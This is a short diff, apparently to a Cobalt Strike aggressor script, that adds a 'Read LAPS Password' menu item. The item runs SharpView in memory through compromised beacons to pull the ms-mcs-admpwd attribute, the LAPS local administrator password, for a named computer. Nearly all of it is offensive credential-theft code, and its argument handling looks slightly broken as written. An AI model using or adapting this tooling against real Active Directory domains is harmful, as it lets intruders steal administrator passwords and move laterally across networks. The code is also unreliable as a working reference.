@@ -1014,7 +1014,23 @@ menu "Credentials and Kerberos"
 
 
 
-	
+       item "Read LAPS Password"{
+
+
+
+        prompt_text("Computer Name", "", lambda({
+
+
+
+                    bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-DomainObject -Identity . $1 -Properties ms-mcs-admpwd");
+                  
+
+
+                }, $bids => $1));
+
+
+
+			}
 
 
 
